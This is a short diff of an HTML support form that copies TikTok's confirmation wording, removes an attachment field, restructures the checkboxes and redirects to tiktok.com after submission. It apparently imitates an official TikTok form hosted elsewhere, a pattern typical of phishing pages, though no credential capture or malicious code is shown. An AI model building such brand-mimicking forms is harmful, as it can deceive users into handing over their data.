@@ -32,18 +32,21 @@
       <label for="details">Tell us more (minimum 50 characters)</label>
       <textarea name="details" rows="6" minlength="50" placeholder="Describe your issue..." required></textarea>
 
-      <label for="attachments">Attachments (optional)</label>
-      <input type="file" name="attachments" accept=".7z,.bmp,.gif,.gz,.jpeg,.jpg,.png,.tif,.tiff,.rar,.tar,.zip" multiple>
-
       <div class="checkbox">
-        <input type="checkbox" name="confirm1" required>
-        I ensure, to the best of my ability and knowledge, that all the information disclosed above is accurate and true.
-      </div>
-      <div class="checkbox">
-        <input type="checkbox" name="confirm2" required>
-        By submitting, I acknowledge that TikTok will process my data in accordance with TikTok’s Privacy Policy.
-      </div>
+  <label>
+    <input type="checkbox" name="confirm1" required>
+    I ensure, to the best of my ability and knowledge, that all the information disclosed above is accurate and true.
+  </label>
+</div>
+<div class="checkbox">
+  <label>
+    <input type="checkbox" name="confirm2" required>
+    By submitting, I acknowledge that TikTok will process my data in accordance with TikTok’s Privacy Policy.
+  </label>
+</div>
 
+
+      
       <!-- Redirect page after submit -->
       <input name="_redirect" type="hidden" value="https://www.tiktok.com">
 
